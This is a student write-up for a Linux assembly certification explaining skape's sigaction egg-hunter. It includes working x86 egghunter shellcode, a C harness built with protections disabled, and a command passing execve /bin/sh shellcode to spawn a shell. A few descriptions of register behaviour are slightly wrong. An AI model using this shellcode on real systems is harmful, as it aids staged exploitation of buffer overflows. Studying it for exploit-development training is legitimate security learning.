# Assignment 3

## What to do
- Study the Egg Hunter shellcode
- Create a working demo of egghunter
- Should configurable for different payloads

###### This study is based on skape's paper _Safely Searching Process Virtual Address Space_ published back in 2004.

The concept of the egg-hunting technique is to search a process' _Virtual Address Space_ for a specific occurrence of the provided egg.

As skape describes, think about searching for a needle in a haystack. In this case, process _Virtual Address Space_ is the haystack and egg is the needle.

This exploitation technique is useful when a very small amount of data to use is available during exploiting a buffer overflow vulnerability.

The actual egg-hunting shellcode is placed in the small available memory location. The attacker then can place a larger payload somewhere else in the process' address space and the actual egg-hunting shellcode will look in the memory for this larger payload.

The mechanism that the studied method uses, involves abusing the system call interface provided by the operating system in order to validate process _Virtual Memory Areas_ in kernel mode.

The implementation being studied here considers *sigaction* sys call. Its real purpose is to allow for defining custom actions to be taken on the receipt of a given signal. In this case, however, it will validate user-mode addresses.

The sigaction function is prototyped as follows:

```c
int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact);
```

At this point, let's have a closer look at the registers during egghunter's execution:

- EAX will hold the sigaction sys call number, `0x43` and later will hold the egg

- EBX will hold signum, there is no need to initialize this register

- ECX will hold act structure, the memory address we want to validate. At first, access to a memory page is validated. If the page is in the process' virtual address space ECX iterates inside this page and checks the existence of the egg. Otherwise, ECX moves to the next memory page.

The page's size can me easily identified:

```zsh
$ getconf PAGE_SIZE
4096
```

- EDX will hold oldact structure and does not have to be initialized to a valid pointer because act structure is checked to see if it is valid before the oldcat structure is.

- EDI will hold the memory address that ECX points to

- ESI there is no need to use this register

The actual egg-hunter Assembly code follows:

```assembly
;
; sigaction egghunter
;

global _start

section .text
_start:

        or cx, 0xfff            ; page allignment
        inc ecx                 ; first address in the memory page
        push byte +0x43         ; sigtran sys call number
        pop eax                 ; sys call number into eax
        int 0x80                ; make sys call
        cmp al, 0xf2            ; check if memory is accessible -EFAULT
        jz $-0xd                ; if memory is not accessible look into another page
        mov eax,0x50905090      ; egg CHANGE ME
        mov edi, ecx            ; load edi with the address that ecx point to
        scasd                   ; compare eax to edi
        jnz $-0x12              ; if not equal inc ecx
        scasd                   ; string compare
        jnz $-0x15              ; if not equal inc ecx
        jmp edi                 ; jmp to shellcode

```

Further notes on the egghunter code

As soon as sigaction sys call is being executed a value is returned in EAX. If the process has access to the specified memory zero is returned.

Otherwise, the error code EFAULT is returned. Since it is an error code returned by a system call, the actual value is negative.

The EFAULT's value is stored in a header file and can be retrieved using the following command:

```zsh
$ cat /usr/include/asm-generic/errno-base.h | grep -w 'EFAULT'
#define	EFAULT		14	/* Bad address */
```

The value (-14) converted to 2's complement binary is 1111 0010 and is stored in EAX. The lower byte stored in EAX will therefore be `0xf2`.

A really efficient method is used to compare the bytes located in memory address pointed by ECX.

The address stored in ECX is moved to EAX. After this move, SCASD instruction follows. This instruction makes a string compare between EAX and EDI.

On a match - memory address pointed by EDI has the first occurrence of the egg - EDI will be increased by one, pointing to the next address that needs to be compared with EAX.

On a second match - EDI has the second occurrence of the egg - the execution continues to the actual shellcode (execve /bin/sh).

The Assembly code can be found in _Assignment #3_ repo named as _egghunter.asm_

The following demo code is the proof of concept:

```c
#include<stdio.h>
#include<stdint.h>
#include<stdlib.h>
#include<string.h>

int main(int argc, char **argv)
{
	uint8_t egghunter[30] =
		"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd"	// skape's egg-hunting demo shellcode
		"\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50"	// \x90\x50\x90\x50 is the demo egg
		"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";	//

	uint32_t j=0, i=0, count =0, count2=0;
	uint8_t *shellcode;

	// usage
	if ( argc != 3 )
	{
		printf("shellcode.c <shellcode> <egg>\n");
		exit(0);
	}

	// calculate the length of the given shellcode
	while ( argv[1][i++] != '\0' )
		count++;

	count = count/3;	// # of bytes

	// given the shellcode, change each char from xXX to XX\0
	// e.g. \x55 will be 55\0
	// each pair must be null terminated for later use in strtol
	i=0;
	do
	{
		argv[1][i] = argv[1][i+1];
		argv[1][i+1] = argv[1][i+2];
		argv[1][i+2] = '\0';
		count2++;
		i=i+3;
	} while ( count-- != 1 );

	// allocate memory for the shellcode
	shellcode = (uint8_t *)malloc(sizeof(uint8_t)*count2+8);

	// place the egg into the shellcode
	for (i=0; i<4; i++)
	{
		shellcode[i] = argv[2][3-i];
		shellcode[i+4] = argv[2][3-i];
	}

	// transform each pair of characters into a number
	// e.g. \x55 will be saved as chars x 5 5
	// strtol will transform 5 5 into a number
	j=0;
	for (i=0; i<count2; i++)
	{
		shellcode[i+8] = (uint8_t) strtol(&argv[1][j], NULL, 16);
		j=j+3;
	}

	// place the new egg in the egghunter
	for (i=0; i<4; i++)
		egghunter[16+i] = argv[2][3-i];


	printf("Shellcode length: %d\n", strlen(egghunter));

	int (*ret)() = (int(*)())egghunter;

	ret();

	return 0;

}

```

The code above can be found in _Assignement #3_ repo and is named as _shellcode.c_

It can be compiled issuing the command `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode`

The produced _elf_ will take two arguments: the shellcode to be executed (in this example execve /bin/sh) and the four-character egg (in this example is the word loot)

```c
$ ./shellcode \x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80 loot
```

The execution of the elf shellcode provided the two arguments, will spawn an sh shell.

/printscreen goes here.

## Statement
This page has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student-ID: SLAE-998
